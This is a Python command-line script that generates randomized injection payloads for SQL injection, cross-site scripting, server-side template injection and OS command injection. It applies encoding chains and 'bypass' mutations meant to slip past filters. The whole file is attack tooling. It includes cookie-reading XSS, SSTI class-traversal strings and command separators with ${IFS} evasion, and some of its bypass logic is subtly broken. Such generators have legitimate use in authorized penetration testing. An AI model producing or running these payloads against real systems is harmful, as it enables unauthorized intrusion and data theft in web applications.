#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import base64
import random
import string
import sys
import urllib.parse
from typing import List, Dict, Optional


class Encoder:
    @staticmethod
    def url(s: str) -> str:
        return urllib.parse.quote(s, safe='')
    @staticmethod
    def double_url(s: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(s, safe=''), safe='')
    @staticmethod
    def b64(s: str) -> str:
        return base64.b64encode(s.encode()).decode()
    @staticmethod
    def hex(s: str) -> str:
        return s.encode().hex()
    @staticmethod
    def unicode(s: str) -> str:
        return ''.join(f'\\u{ord(c):04x}' for c in s)
    @staticmethod
    def html(s: str) -> str:
        return ''.join(f'&#{ord(c)};' for c in s)
    @staticmethod
    def rev(s: str) -> str:
        return s[::-1]
    @staticmethod
    def rot13(s: str) -> str:
        return s.translate(str.maketrans(
            'ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz',
            'NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm'
        ))
    @staticmethod
    def nullbyte(s: str) -> str:
        return '%00'.join(s[i:i+2] for i in range(0, len(s), 2))
    @staticmethod
    def randcase(s: str) -> str:
        return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in s)
    
    @classmethod
    def apply_chain(cls, encodings: List[str], payload: str) -> str:
        enc_map = {
            'url': cls.url, 'durl': cls.double_url, 'b64': cls.b64,
            'hex': cls.hex, 'unicode': cls.unicode, 'html': cls.html,
            'rev': cls.rev, 'rot13': cls.rot13, 'nullbyte': cls.nullbyte,
            'randcase': cls.randcase
        }
        for e in encodings:
            if e in enc_map:
                payload = enc_map[e](payload)
        return payload


class DynamicGenerator:
    def __init__(self):
        self.rng = random.Random()
    
    def _rand_str(self, min_len=2, max_len=8) -> str:
        return ''.join(self.rng.choice(string.ascii_letters + string.digits) for _ in range(self.rng.randint(min_len, max_len)))
    
    def _rand_int(self, min_val=1, max_val=999) -> int:
        return self.rng.randint(min_val, max_val)
    
    # -------------- SQL --------------
    def gen_sql(self, count: int, context: str = 'generic', bypass: bool = False) -> List[str]:
        payloads = set()
        operators = ['OR', 'AND', '||', '&&']
        comparisons = ['=', 'LIKE', 'IN', 'BETWEEN', 'REGEXP']
        sleep_funcs = ['SLEEP({})', 'pg_sleep({})', "WAITFOR DELAY '0:0:{}'", 'BENCHMARK({},MD5(1))']
        comments = ['--', '#', '/*', ';%00']
        for _ in range(count * 3):  
            parts = []
            if self.rng.choice([True, False]):
                op = self.rng.choice(operators)
                comp = self.rng.choice(comparisons)
                left = self._sql_value()
                right = self._sql_value()
                parts.append(f"{left} {op} {right}")
            if self.rng.choice([True, False]):
                cols = self.rng.randint(1, 4)
                nulls = ','.join(['NULL'] * cols)
                parts.append(f"UNION SELECT {nulls}")
            if self.rng.choice([True, False]):
                sleep_tpl = self.rng.choice(sleep_funcs)
                delay = self.rng.randint(1, 5)
                parts.append(sleep_tpl.format(delay))
            suffix = self.rng.choice(comments) if self.rng.random() > 0.5 else ''
            if context == 'value':
                delim = self.rng.choice(["'", '"', '`'])
                full = delim + ' '.join(parts) + suffix + delim
            elif context == 'numeric':
                full = ' '.join(parts) + suffix
            else:  
                full = ' '.join(parts) + suffix
            
            if full.strip():
                payloads.add(full)
            if len(payloads) >= count:
                break
        return list(payloads)[:count]
    
    def _sql_value(self) -> str:
        if self.rng.choice([True, False]):
            delim = self.rng.choice(["'", '"', '`'])
            return delim + self._rand_str(1, 4) + delim
        else:
            return str(self._rand_int())
    
    # -------------- XSS --------------
    def gen_xss(self, count: int, context: str = 'html', bypass: bool = False) -> List[str]:
        payloads = set()
        tags = ['script', 'img', 'svg', 'body', 'input', 'iframe', 'video']
        events = ['onload', 'onerror', 'onmouseover', 'onfocus', 'onclick']
        js_funcs = ['alert', 'confirm', 'prompt', 'console.log']
        for _ in range(count * 3):
            if context == 'html':
                tag = self.rng.choice(tags)
                event = self.rng.choice(events)
                js = f"{self.rng.choice(js_funcs)}({self.rng.choice(['1', "'XSS'", 'document.cookie'])})"
                payload = f"<{tag} {event}={js}>"
            elif context == 'attribute':
                wrap = self.rng.choice(["'", '"', '`'])
                js = f"{self.rng.choice(js_funcs)}({self.rng.choice(['1', "'XSS'"])})"
                payload = f"{wrap}{js}{wrap}"
            elif context == 'uri':
                payload = f"javascript:{self.rng.choice(js_funcs)}(1)"
            else:
                js = f"{self.rng.choice(js_funcs)}(1)"
                payload = f"<script>{js}</script>"
            
            if bypass:
                payload = payload.replace('<', '&lt;').replace('>', '&gt;')
                payload = Encoder.randcase(payload)
            payloads.add(payload)
            if len(payloads) >= count:
                break
        return list(payloads)[:count]
    
    # -------------- SSTI --------------
    def gen_ssti(self, count: int, bypass: bool = False) -> List[str]:
        payloads = set()
        open_tokens = ['{{', '${', '#{', '*{', '@(', '<%=', '#set(']
        close_tokens = ['}}', '}', '}', '}', ')', '%>', ')']
        for _ in range(count * 3):
            idx = self.rng.randint(0, len(open_tokens)-1)
            open_tok = open_tokens[idx]
            close_tok = close_tokens[idx]
            if self.rng.choice([True, False]):
                expr = f"{self._rand_int(1,9)}{self.rng.choice(['+','-','*'])}{self._rand_int(1,9)}"
            else:
                var = self.rng.choice(['config', 'self', 'request', 'app'])
                if bypass and self.rng.choice([True, False]):
                    expr = f"{var}.__class__.__mro__[1].__subclasses__()"
                else:
                    expr = var
            payload = f"{open_tok}{expr}{close_tok}"
            if bypass:
                payload = payload.replace('{{', '{%').replace('}}', '%}')
                payload = Encoder.randcase(payload)
            payloads.add(payload)
            if len(payloads) >= count:
                break
        return list(payloads)[:count]
    
    # -------------- CMD --------------
    def gen_cmd(self, command: str, count: int, bypass: bool = False) -> List[str]:
        payloads = set()
        separators = [';', '|', '||', '&', '&&', '`', '$(']
        spaces = [' ', '%20', '\t', '${IFS}', '{IFS}']
        for _ in range(count * 3):
            sep = self.rng.choice(separators)
            space = self.rng.choice(spaces)
            extra = ''
            if bypass:
                extra = self.rng.choice([' #', ' 2>&1', ' > /dev/null'])
            payload = f"{sep}{space}{command}{space}{extra}"
            if self.rng.random() > 0.3:
                payload = command + space + extra
            payloads.add(payload)
            if len(payloads) >= count:
                break
        return list(payloads)[:count]


def main():
    parser = argparse.ArgumentParser(
        description='Dynamic payload generator (SQL, XSS, SSTI, CMD)',
        epilog='Examples: %(prog)s -t sql --bypass --encode url b64 -n 500\n'
               '         %(prog)s -t xss --context html -n 200\n'
               '         %(prog)s -t cmd --command "id" --encode hex --bypass'
    )
    parser.add_argument('-t', '--type', required=True, choices=['sql', 'xss', 'ssti', 'cmd'], help='Type of injection')
    parser.add_argument('-n', '--limit', type=int, default=100, help='Number of generated payloads')
    parser.add_argument('--context', default='generic', help='Context: sql: value/numeric/generic | xss: html/attribute/uri')
    parser.add_argument('--bypass', action='store_true', help='Apply bypass mutations (depends on type)')
    parser.add_argument('--encode', nargs='+', choices=['url','durl','b64','hex','unicode','html','rev','rot13','nullbyte','randcase'], help='Coding chain')
    parser.add_argument('--command', default='whoami', help='Command for cmd-onjection')
    parser.add_argument('-o', '--output', help='File to save')
    parser.add_argument('--json', action='store_true', help='Output to JSON')
    args = parser.parse_args()
    
    gen = DynamicGenerator()
    
    if args.type == 'sql':
        payloads = gen.gen_sql(count=args.limit, context=args.context, bypass=args.bypass)
    elif args.type == 'xss':
        payloads = gen.gen_xss(count=args.limit, context=args.context, bypass=args.bypass)
    elif args.type == 'ssti':
        payloads = gen.gen_ssti(count=args.limit, bypass=args.bypass)
    else:  # cmd
        payloads = gen.gen_cmd(command=args.command, count=args.limit, bypass=args.bypass)
    
    if args.encode:
        payloads = [Encoder.apply_chain(args.encode, p) for p in payloads]
    
    if args.json:
        import json as jsonlib
        out = jsonlib.dumps(payloads, indent=2)
    else:
        out = '\n'.join(payloads)
    
    if args.output:
        with open(args.output, 'w', encoding='utf-8') as f:
            f.write(out)
        print(f"[+] Saved {len(payloads)} payloads in {args.output}", file=sys.stderr)
    else:
        print(out)

if __name__ == '__main__':
    main()